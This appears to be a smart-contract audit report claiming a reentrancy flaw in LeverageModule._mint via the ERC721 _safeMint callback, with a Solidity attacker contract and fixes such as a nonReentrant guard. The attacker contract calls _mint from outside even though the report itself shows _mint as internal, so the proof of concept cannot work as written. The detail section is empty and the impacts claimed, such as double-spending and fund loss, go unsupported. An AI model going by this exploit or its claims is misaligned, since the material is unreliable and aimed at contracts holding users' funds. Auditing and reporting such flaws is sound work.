# Reentrancy Vulnerability in `LeverageModule._mint(address)` Leading to Loss of Fund, Double Spending and Spend Manipulation

## Summary
The function `_mint` in the `LeverageModule` contract is vulnerable to reentrancy attacks due to an external call to the `_safeMint` function, which may invoke a callback function in the recipient contract (`IERC721Receiver`). If the recipient contract executes malicious code during the callback, it could manipulate the state of the `LeverageModule` contract or other contracts interacting with it.
## Vulnerability Detail

## Impact

-     State Manipulation: Attackers could exploit this vulnerability to manipulate critical state variables such as `tokenIdNext`.

-     Double-Spending: Reentrancy attacks might allow an attacker to mint the same token ID multiple times or transfer it multiple times, leading to double-spending issues.

-     Loss of Funds: If the vulnerability is exploited, users or the contract could face loss of assets, either directly or indirectly.

## Proof of Concept 

-     Deploy the `LeverageModule` Contract
-     Deploy the Malicious Contract: Create a malicious contract that implements the IERC721Receiver interface. In the onERC721Received function, include a callback that calls back into the _mint function of the LeverageModule contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./LeverageModule.sol";

contract MaliciousContract is IERC721Receiver {
    LeverageModule public leverageModule;

    constructor(address _leverageModule) {
        leverageModule = LeverageModule(_leverageModule);
    }

    // Implement IERC721Receiver's onERC721Received function
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
        // Exploit: reenter the leverageModule's _mint function
        // NOTE: The conditions for reentry and parameters should be controlled
        leverageModule._mint(address(this));
        
        // Return the function selector for ERC721 acceptance
        return this.onERC721Received.selector;
    }

    // Function to initiate the reentrancy attack
    function exploit() external {
        // Call the _mint function from LeverageModule
        leverageModule._mint(address(this));
    }
}

```

Manual Review

## Recommendation

- Add a reentrancy guard to the `_mint` function to prevent multiple invocations of the function in the same transaction.

Add `nonReentrant` modifier from OpenZeppelin's ReentrancyGuard contract to the `_mint` function signature:
```solidity
function _mint(address _to) internal nonReentrant {
    
}

```

- Avoid or minimize external calls within critical functions. In this case, you could consider using _mint instead of _safeMint if you can assume the recipient contract is always safe

-  Update state variables before performing external calls to reduce the attack surface. Move the increment of `tokenIdNext` (`tokenIdNext += 1;`) to a point before the call to `_safeMint`.

-  Ensure that the recipient contract is a legitimate `IERC721Receiver` implementation and handle any unexpected behavior gracefully.
